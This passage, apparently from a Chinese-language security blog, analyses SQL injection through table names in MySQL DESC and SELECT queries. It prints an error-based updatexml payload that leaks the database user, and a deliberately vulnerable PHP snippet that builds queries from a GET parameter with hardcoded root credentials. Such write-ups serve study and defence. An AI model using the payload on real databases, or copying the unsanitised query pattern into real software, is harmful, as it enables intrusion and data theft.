-<p>可解,<br><img src="http://onw16foqc.bkt.clouddn.com/14923490866702.jpg"></p>
-<p>shop_users 后面的两个``,做了shop_users 表的别名,所以无影响。<br>这时候desc的语句为,</p>
-<pre><code>desc `shop_users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`</code></pre>
-<p>看一下DESC的Syntax   </p>
-<pre><code>DESC tbl_name [col_name | wild]</code></pre>
-<p>可以看到表名后面可以接col_name 或者 wild<br>为什么表名后面接了where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)# 却没有报unknown column,<br>感觉是因为这个应该是按照wild来执行的,</p>
-<blockquote>
-<p>wild, if given, is a pattern string. It can contain the SQL % and _ wildcard characters.</p>
-</blockquote>
-<p>所以不会报unknown column。</p>
-<h4 id="0x05-表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote"><a href="#0x05-表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote" class="headerlink" title="0x05 表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote"></a>0x05 表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote</h4><p>跟上面一个利用差不多,稍微改一下。</p>
-<pre><code>    mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
-    mysql_query(&quot;use b2cshop&quot;);
-    $table = $_GET[&#39;table&#39;];
-    mysql_query(&quot;desc shop_&#123;$table&#125;&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
-    $sql = &quot;select * from `shop_&#123;$table&#125;` where 1=1&quot;;
-    echo $sql;
-    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
-    echo mysql_error();</code></pre>
-<p><img src="http://onw16foqc.bkt.clouddn.com/14923497093942.jpg"></p>
 
       
     </div>
